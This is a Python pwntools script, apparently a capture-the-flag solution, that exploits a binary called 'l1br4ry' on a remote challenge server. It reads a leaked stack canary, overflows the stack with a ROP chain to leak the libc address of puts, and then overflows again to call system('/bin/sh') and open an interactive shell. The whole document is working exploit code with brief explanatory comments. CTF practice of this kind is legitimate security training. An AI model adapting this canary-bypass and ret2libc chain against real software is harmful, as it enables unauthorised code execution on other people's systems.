#!/usr/bin/env python3


#A simple ROP challenge with a stack canary in which they leak.
#We just need to parse the canary value given by the program 
#To perform a overflow first to leak puts address by ret2plt and then return back to main
#And finally using the same canary to overflow again but this time to execute system(/bin/sh) using the leaks


from pwn import *


e = ELF("./l1br4ry")
libc = ELF("./libc.so.6")
#r = process("./l1br4ry")
r = remote("gc1.eng.run",31914)
rop = ROP(e)
pop_rdi = rop.find_gadget(['pop rdi'])[0]
ret = rop.find_gadget(['ret'])[0]
r.recvuntil(b"Welcome to the l1br4ry, here is a gift for you: ")
canary = int(r.recvline().strip(),16)
exploit = b'A' * 24 + p64(canary) + b'A' * 8 + p64(pop_rdi) + p64(e.got["puts"]) + p64(e.plt["puts"]) + p64(e.sym.main)
r.send(exploit)
r.recvuntil(b"But do you know about system?")
libc_leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
libc_base = libc_leak - libc.sym.puts
exploit = b"A" * 24 + p64(canary) + b'A' * 8 + p64(ret) + p64(pop_rdi) + p64(libc_base + next(libc.search(b"/bin/sh\x00"))) + p64(libc_base + libc.sym.system)
r.send(exploit)
r.interactive()

